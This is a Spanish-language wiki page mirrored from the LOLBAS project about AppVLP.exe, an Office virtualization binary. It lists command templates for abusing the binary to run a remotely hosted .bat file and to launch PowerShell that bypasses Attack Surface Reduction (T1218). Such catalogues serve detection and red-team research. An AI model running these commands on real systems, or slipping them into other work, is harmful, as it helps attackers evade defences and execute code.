# LOLBAS: Appvlp.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

Application Virtualization Utility Included with Microsoft Office 2016

## Comandos

### Execution of BAT file hosted on Webdav server.

Execute · priv: User · T1218

```cmd
AppVLP.exe {PATH_SMB:.bat}
```

Executes .bat file through AppVLP.exe

### Local execution of process bypassing Attack Surface Reduction (ASR).

Execute · priv: User · T1218

```cmd
AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)"
```

Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.

